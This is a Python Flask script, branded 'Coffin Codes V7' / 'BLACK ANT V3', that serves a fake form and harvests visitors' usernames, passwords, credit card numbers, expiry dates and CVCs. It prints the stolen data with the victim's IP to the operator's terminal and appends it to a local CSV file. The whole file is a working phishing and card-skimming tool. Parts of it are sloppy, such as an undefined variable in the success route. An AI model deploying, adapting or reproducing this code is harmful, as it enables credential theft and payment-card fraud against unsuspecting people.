#!/usr/bin/python3
# Developer : BSB Developers
# Coffin Codes V7
# By SphaBSB 2192
# We do everything like a sir !!!


import os
import csv
import ifcfg
import socket
import platform

from flask import request
from datetime import datetime
from flask_mail import Mail, Message
from form_contact import ContactForm, csrf
from flask import Flask, render_template, request, redirect


os.system("clear")
hostname = socket.gethostname()
ip_address = socket.gethostbyname(hostname)
my_system = platform.uname()
app = Flask(__name__)
SECRET_KEY = os.urandom(32)
app.config['SECRET_KEY'] = SECRET_KEY
csrf.init_app(app)
app.config['UPLOAD_FOLDER'] = 'test_images'
app.secret_key = 'blahblahuploaderblahhhh'

@app.route('/')
def index():
      form = ContactForm()
      return render_template('contact.html', form=form)


@app.route('/contact', methods=['POST', 'GET'])
def contact():
    form = ContactForm()
    if form.validate_on_submit():
        name = request.form['name']
        cnum = request.form['cnum']
        exd = request.form['exd']
        cvc = request.form['cvc']
        password = request.form['password']
        current_date_time = datetime.now()
        fieldnames = ['name', 'password', 'info', 'file', 'cnum', 'exd', 'cvc']
        print('\033[92m▄ █ ▄ █ ▄ ▄ █ ̳▄ █ ▄ █ ▄ ▄ ▄ █ ▄ █ ▄ ▄ ▄ █ ▄ █ ▄ ▄ █')
        print('--------------------\033[91mBLACK ANT V3\033[92m--------------------')
        print(f"\033[95m[#]My System\033[96m: {my_system.system}")
        print('\033[95m[#]User Ip:\033[96m', request.environ.get('HTTP_X_REAL_IP' , request.remote_addr))
        print('\033[97m▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄')
        print('\033[93m--Username:\033[91m')
        print(request.form['name'])
        print("\n")
        print('\033[93m--Card Number:\033[91m')
        print(request.form['cnum'])
        print("\n")
        print('\033[93m--Exp Date:\033[91m')
        print(request.form['exd'])
        print("\n")
        print('\033[93m--CVC:\033[91m')
        print(request.form['cvc'])
        print("\n")
        print('\033[93m--Password:\033[91m')
        print(request.form['password'])
        print('\033[94m▄ █ ▄ █ ▄ ▄ █ ̳▄ █ ▄ █ ▄ ▄ ▄ █ ▄ █ ▄ ▄ ▄ █ ▄ █ ▄ ▄ █')
        with open('Data.csv','a') as inFile:
            writer = csv.DictWriter(inFile, fieldnames=fieldnames, delimiter='"', quotechar='"', quoting=csv.QUOTE_MINIMAL )
            writer.writerow({'info': '________________LogIn Data______________'})
            writer.writerow({'info': current_date_time})
            writer.writerow({'name': name})
            writer.writerow({'cnum': cnum})
            writer.writerow({'exd': exd})
            writer.writerow({'cvc': cvc})
            writer.writerow({'password' : password})
            writer.writerow({'info': '________________End Data________________'}) 
        return redirect('/success')    
    return render_template('contact.html', form=form)

      
@app.route('/success', methods=['POST', 'GET'])
def success():
    form = ContactForm()
    if form.validate_on_submit():        
        print('\033[91m---------password----------------')
        print(request.form['name'])
        print('-------------------------')
        print(city)
        return redirect('/success')
    return render_template('success.html', form=form)



if __name__ == "__main__":
    app.run(port=443, debug = True)
